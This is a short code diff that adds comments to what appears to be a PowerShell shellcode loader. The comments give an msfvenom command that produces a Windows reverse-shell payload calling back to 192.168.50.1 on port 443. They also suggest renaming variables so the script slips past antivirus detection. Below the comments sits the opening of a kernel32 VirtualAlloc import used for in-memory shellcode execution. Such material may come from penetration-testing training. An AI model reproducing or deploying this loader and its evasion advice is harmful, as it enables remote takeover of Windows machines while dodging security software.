@@ -1,3 +1,7 @@
+# Generate Payload for $sc variable with: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
+# Hint: If script is still blocked by antivirus software, we can try to change variable names $winFunc and/or $sc to something more generic like $var1 and $var2
+
+
 $code = '
 [DllImport("kernel32.dll")]
 public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
